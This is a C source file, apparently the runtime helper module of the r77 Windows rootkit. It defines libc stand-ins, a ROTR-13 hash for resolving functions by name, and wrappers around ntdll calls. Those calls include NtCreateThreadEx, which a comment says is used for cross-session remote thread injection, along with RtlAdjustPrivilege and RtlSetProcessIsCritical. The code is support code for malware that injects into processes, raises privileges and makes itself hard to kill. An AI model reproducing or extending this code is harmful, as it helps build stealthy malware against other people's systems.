#include "r77runtime.h"
#include "r77win.h"
#include "ntdll.h"

VOID libc_memcpy(LPVOID dest, LPVOID src, SIZE_T size)
{
	for (volatile LPBYTE destPtr = dest, srcPtr = src; size; size--)
	{
		*destPtr++ = *srcPtr++;
	}
}
VOID libc_wmemcpy(LPVOID dest, LPVOID src, SIZE_T size)
{
	for (volatile PWCHAR destPtr = dest, srcPtr = src; size; size--)
	{
		*destPtr++ = *srcPtr++;
	}
}
VOID libc_memset(LPVOID dest, INT value, SIZE_T size)
{
	for (volatile LPBYTE destPtr = dest; size; size--)
	{
		*destPtr++ = value;
	}
}
VOID libc_ltow(LONG value, PWCHAR buffer)
{
	if (value < 0)
	{
		*buffer++ = L'-';
		value = -value;
	}

	INT length = 0;
	for (LONG i = value; i; i /= 10)
	{
		length++;
	}

	for (INT i = 0; i < length; i++)
	{
		buffer[length - i - 1] = L'0' + value % 10;
		value /= 10;
	}

	buffer[length] = L'\0';
}
DWORD libc_strhash(LPCSTR str)
{
	DWORD hash = 0;

	while (*str)
	{
		hash = ROTR(hash, 13) + *str++;
	}

	return hash;
}
DWORD libc_strhashi(LPCSTR str, USHORT length)
{
	DWORD hash = 0;

	for (; length--; str++)
	{
		hash = ROTR(hash, 13) + (*str >= 'a' ? *str - 0x20 : *str);
	}

	return hash;
}

NTSTATUS NTAPI NtQueryObject2(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
{
	// NtQueryObject must be called by using GetProcAddress on Windows 7.
	return ((NT_NTQUERYOBJECT)GetFunction("ntdll.dll", "NtQueryObject"))(handle, objectInformationClass, objectInformation, objectInformationLength, returnLength);
}
NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer)
{
	// Use NtCreateThreadEx instead of CreateRemoteThread.
	// CreateRemoteThread does not work across sessions in Windows 7.
	return ((NT_NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
}
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue)
{
	return ((NT_RTLADJUSTPRIVILEGE)GetFunction("ntdll.dll", "RtlAdjustPrivilege"))(privilege, enablePrivilege, isThreadPrivilege, previousValue);
}
NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
{
	return ((NT_RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
}
BOOL IsWindows10OrGreater2()
{
	// This function must re-written in order to be compatible with /NODEFAULTLIB

	OSVERSIONINFOEXW versionInfo;
	libc_memset(&versionInfo, 0, sizeof(OSVERSIONINFOEXW));
	versionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	versionInfo.dwMajorVersion = HIBYTE(_WIN32_WINNT_WINTHRESHOLD);
	versionInfo.dwMinorVersion = LOBYTE(_WIN32_WINNT_WINTHRESHOLD);
	versionInfo.wServicePackMajor = 0;

	DWORDLONG conditionMask = VerSetConditionMask(VerSetConditionMask(VerSetConditionMask(0, VER_MAJORVERSION, VER_GREATER_EQUAL), VER_MINORVERSION, VER_GREATER_EQUAL), VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);
	return VerifyVersionInfoW(&versionInfo, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, conditionMask) != FALSE;
}